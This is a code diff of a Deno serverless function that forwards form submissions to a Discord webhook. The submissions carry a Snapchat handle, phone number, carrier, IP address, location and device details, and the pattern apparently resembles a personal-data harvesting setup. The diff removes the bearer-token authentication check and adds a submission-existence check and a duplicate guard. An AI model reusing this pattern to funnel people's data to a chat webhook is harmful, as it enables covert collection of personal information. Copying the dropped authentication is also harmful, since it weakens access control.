@@ -3,16 +3,28 @@ import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';
 const DISCORD_WEBHOOK = Deno.env.get("DISCORD_WEBHOOK");
 
 Deno.serve(async (req) => {
-  const authHeader = req.headers.get("authorization") || "";
-  const token = authHeader.replace("Bearer ", "");
-  const expectedToken = Deno.env.get("WEBHOOK_SECRET");
-  if (expectedToken && token !== expectedToken) {
-    return Response.json({ error: "Unauthorized" }, { status: 401 });
-  }
-
   const base44 = createClientFromRequest(req);
   const body = await req.json();
   const { snapchat, telephone, operateur, submissionId, ip, country, city, browser, device } = body;
+
+  // ---- Anti-spam : la soumission doit exister en base et ne pas avoir déjà été notifiée ----
+  if (!submissionId) {
+    return Response.json({ error: "submissionId requis" }, { status: 400 });
+  }
+  let sub = null;
+  try {
+    sub = await base44.asServiceRole.entities.Submission.get(submissionId);
+  } catch (e) {
+    return Response.json({ error: "Soumission introuvable" }, { status: 403 });
+  }
+  if (!sub) {
+    return Response.json({ error: "Soumission introuvable" }, { status: 403 });
+  }
+  // Idempotence : un seul post Discord par soumission
+  const alreadyLogged = await base44.asServiceRole.entities.ActionLog.filter({ submission_id: submissionId, action: "submitted" }, "-created_date", 1);
+  if (alreadyLogged && alreadyLogged.length > 0) {
+    return Response.json({ error: "Déjà notifié" }, { status: 409 });
+  }
 
   const formatPhone = (tel) => tel.replace(/(\d{2})(?=\d)/g, '$1 ').trim();
   const formatPhoneRaw = (tel) => tel.replace(/\D/g, '').slice(-10);
